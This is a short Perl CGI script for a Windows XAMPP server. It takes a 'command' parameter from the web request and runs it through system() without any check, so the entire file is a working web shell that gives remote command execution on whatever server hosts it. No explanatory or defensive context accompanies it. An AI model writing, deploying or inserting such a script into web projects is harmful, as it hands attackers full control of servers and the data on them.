#!D:\xampp\perl\bin\perl.exe
use CGI':standard';
print("content-type:text/html\n\n");
$c=param('command');
print(system($c));
exit(0);